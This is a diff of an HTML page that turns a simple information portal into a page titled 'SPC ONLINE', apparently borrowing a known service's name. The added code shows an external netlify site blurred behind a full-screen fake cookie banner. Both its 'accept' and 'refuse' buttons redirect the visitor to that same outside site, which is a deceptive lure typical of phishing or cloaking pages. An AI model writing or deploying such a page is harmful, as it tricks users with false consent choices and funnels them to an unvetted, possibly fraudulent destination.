@@ -1,86 +1,137 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
+
+
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Portal de Informações</title>
+<title>SPC ONLINE</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+</head>
 
 <style>
 
-body{
-font-family:Arial;
-background:#f4f6f8;
-display:flex;
-justify-content:center;
-align-items:center;
-height:100vh;
+/* RESET */
+*{
 margin:0;
+padding:0;
+box-sizing:border-box;
 }
 
-.card{
+/* BLOQUEIA SCROLL */
+html,body{
+height:100%;
+overflow:hidden;
+}
+
+body{
+position:fixed;
+width:100%;
+height:100dvh;
+}
+
+/* container */
+.site-wrapper{
+position:relative;
+width:100%;
+height:100dvh;
+}
+
+/* iframe */
+.site-frame{
+width:100%;
+height:100%;
+border:none;
+filter:blur(6px);
+transition:filter .4s;
+pointer-events:none;
+}
+
+/* COOKIE */
+.cookie-overlay{
+position:absolute;
+bottom:0;
+left:0;
+width:100%;
 background:white;
-padding:40px;
-max-width:500px;
-text-align:center;
-border-radius:10px;
-box-shadow:0 10px 25px rgba(0,0,0,0.1);
+padding:25px;
+box-shadow:0 -10px 30px rgba(0,0,0,0.2);
+font-family:Arial;
+z-index:9999;
 }
 
-h1{
-margin-bottom:10px;
+/* botões */
+.cookie-buttons{
+margin-top:15px;
 }
 
-p{
-color:#555;
-margin-bottom:20px;
-}
-
-.btn{
-display:block;
-background:#2563eb;
-color:white;
-text-decoration:none;
-padding:15px;
+.cookie-buttons button{
+padding:12px 25px;
 border-radius:6px;
-font-weight:bold;
+border:1px solid #c33;
+background:white;
+color:#c33;
+margin-right:10px;
+cursor:pointer;
 }
 
-.footer{
-margin-top:20px;
-font-size:12px;
-color:#777;
+.cookie-buttons button.accept{
+background:#c33;
+color:white;
 }
 
-.footer a{
-margin:0 5px;
-color:#2563eb;
-text-decoration:none;
+/* MOBILE */
+@media (max-width:600px){
+
+.cookie-overlay{
+padding:20px;
+font-size:16px;
+}
+
+.cookie-buttons{
+display:flex;
+flex-direction:column;
+gap:10px;
+}
+
+.cookie-buttons button{
+width:100%;
+padding:16px;
+font-size:16px;
+}
+
 }
 
 </style>
-</head>
 
-<body>
 
-<div class="card">
+<div class="site-wrapper">
 
-<h1>Portal de Informações</h1>
+<iframe
+class="site-frame"
+id="siteFrame"
+src="https://idyllic-unicorn-dcf7b5.netlify.app/">
+</iframe>
 
-<p>
-Nesta página você pode acessar conteúdos informativos e ofertas disponíveis online.
-</p>
 
-<a class="btn" href="https://bucolic-taffy-ffeae0.netlify.app/">
-Acessar página
-</a>
+<div class="cookie-overlay" id="cookieBox">
 
-<div class="footer">
-<a href="privacidade.html">Política de Privacidade</a> |
-<a href="termos.html">Termos</a> |
-<a href="contato.html">Contato</a>
+<strong>Configurações de cookies</strong><br>
+Utilizamos cookies para melhorar sua navegação e oferecer uma melhor experiência. Para mais informações, consulte nossa Política de Cookies.
+
+<div class="cookie-buttons">
+<button class="accept" onclick="goLink()">Aceitar todos</button>
+<button onclick="goLink()">Recusar</button>
 </div>
 
 </div>
 
-</body>
-</html>
+</div>
+
+
+<script>
+
+function goLink(){
+
+window.location.href="https://idyllic-unicorn-dcf7b5.netlify.app/";
+
+}
+
+</script>
+```
